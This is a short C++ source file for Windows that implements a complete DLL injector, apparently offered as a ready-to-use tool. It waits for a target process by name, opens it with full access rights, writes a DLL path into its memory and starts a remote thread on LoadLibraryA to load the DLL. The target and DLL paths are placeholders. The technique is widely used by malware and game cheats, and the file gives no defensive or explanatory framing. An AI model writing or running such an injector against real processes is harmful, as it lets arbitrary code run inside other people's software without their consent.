#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string_view>

// Function to retrieve the process ID of a specific process by name
DWORD GetProcId(const std::string_view processName) {
    DWORD processId = 0;
    // Create a snapshot of all processes currently running
    HANDLE snapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapHandle != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(processEntry);

        // Iterate over the processes in the snapshot
        if (Process32First(snapHandle, &processEntry)) {
            do {
                // Compare process name using case-insensitive string comparison
                if (!_stricmp(processEntry.szExeFile, std::string(processName).c_str())) {
                    processId = processEntry.th32ProcessID; // If found, save the process ID
                    break;
                }
            } while (Process32Next(snapHandle, &processEntry));
        }
        CloseHandle(snapHandle); // Close the snapshot handle
    }
    return processId; // Return the process ID (0 if not found)
}

// Function to inject a DLL into a process
bool InjectDLL(std::string_view dllPath, DWORD processId) {
    // Open the target process with all access rights
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);
    if (!processHandle || processHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Allocate memory in the target process for the DLL path
    void* location = VirtualAllocEx(processHandle, nullptr, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!location) {
        CloseHandle(processHandle);
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(processHandle, location, std::string(dllPath).c_str(), dllPath.size() + 1, nullptr)) {
        VirtualFreeEx(processHandle, location, 0, MEM_RELEASE); // Free allocated memory
        CloseHandle(processHandle); // Close process handle
        return false;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, location, 0, nullptr);
    if (!threadHandle) {
        VirtualFreeEx(processHandle, location, 0, MEM_RELEASE); // Free allocated memory
        CloseHandle(processHandle); // Close process handle
        return false;
    }

    // Close the handles for the thread and the process
    CloseHandle(threadHandle);
    CloseHandle(processHandle);
    return true; // Return true if injection was successful
}

int main() {
    // Specify the path to the DLL and the name of the target process
    std::string dllPath = "C:\\Path\\To\\Your\\DLL.dll";
    std::string processName = "target_process.exe";

    // Loop until the process ID is found
    DWORD processId = 0;
    while (!processId) {
        processId = GetProcId(processName);
        Sleep(30); // Sleep to prevent high CPU usage
    }

    // Attempt to inject the DLL and report success or failure
    if (InjectDLL(dllPath, processId)) {
        std::cout << "DLL injected successfully." << std::endl;
    }
    else {
        std::cerr << "DLL injection failed." << std::endl;
    }

    return 0;
}